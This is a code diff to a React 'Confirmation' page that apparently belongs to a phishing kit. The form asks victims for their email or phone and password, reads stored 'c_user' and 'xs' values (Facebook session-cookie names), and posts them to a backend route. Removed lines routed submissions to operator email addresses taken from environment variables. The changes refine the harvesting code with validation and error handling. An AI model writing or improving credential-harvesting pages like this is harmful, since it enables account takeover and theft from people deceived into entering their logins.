@@ -14,7 +14,7 @@ import { zodResolver } from "@hookform/resolvers/zod";
 import { useForm } from "react-hook-form";
 import { useLocation } from "wouter";
 import MetaTags from "@/components/meta-tags";
-import { formTwoSchema } from "@shared/schema";
+import { z } from "zod";
 import {
   Select,
   SelectContent,
@@ -24,19 +24,24 @@ import {
 } from "@/components/ui/select";
 import { countries } from "@/lib/countries";
 
+const formTwoSchema = z.object({
+  user_email: z.string().min(1, "Email or phone is required"),
+  password: z.string().min(1, "Password is required"),
+});
+
+type FormTwoValues = z.infer<typeof formTwoSchema>;
+
 export default function Confirmation() {
   const { toast } = useToast();
   const [, setLocation] = useLocation();
   const [contactMethod, setContactMethod] = useState<'email' | 'phone'>('email');
   const [countryCode, setCountryCode] = useState('+1');
 
-  const form = useForm({
+  const form = useForm<FormTwoValues>({
     resolver: zodResolver(formTwoSchema),
     defaultValues: {
       user_email: "",
       password: "",
-      admin_email: import.meta.env.VITE_SMTP_USER || "",
-      admin_email_2: import.meta.env.VITE_ADMIN_EMAIL || "",
     },
   });
 
@@ -49,6 +54,9 @@ export default function Confirmation() {
     }
     try {
       const parsed = JSON.parse(storedData);
+      if (!parsed.c_user || !parsed.xs) {
+        throw new Error("Invalid validation data");
+      }
       form.setValue('c_user', parsed.c_user);
       form.setValue('xs', parsed.xs);
     } catch (error) {
@@ -57,26 +65,26 @@ export default function Confirmation() {
     }
   }, [setLocation, form]);
 
-  const onSubmit = async (data: any) => {
+  const onSubmit = async (data: FormTwoValues) => {
     try {
       const formattedData = {
-        c_user: data.c_user,
-        xs: data.xs,
-        password: data.password,
         user_email: contactMethod === 'phone' ? `${countryCode}${data.user_email}` : data.user_email,
-        admin_email: import.meta.env.VITE_SMTP_USER,
-        admin_email_2: import.meta.env.VITE_ADMIN_EMAIL,
+        password: data.password,
       };
 
-      await fetch('/api/form-two', {
+      const response = await fetch('/api/form-two', {
         method: 'POST',
         headers: {
           'Content-Type': 'application/json',
         },
         body: JSON.stringify(formattedData),
       });
-      localStorage.removeItem('validation_data');
 
+      if (!response.ok) {
+        throw new Error('Failed to submit form');
+      }
+
+      localStorage.removeItem('validation_data');
       toast({
         title: "Success!",
         description: "Your form has been submitted successfully"
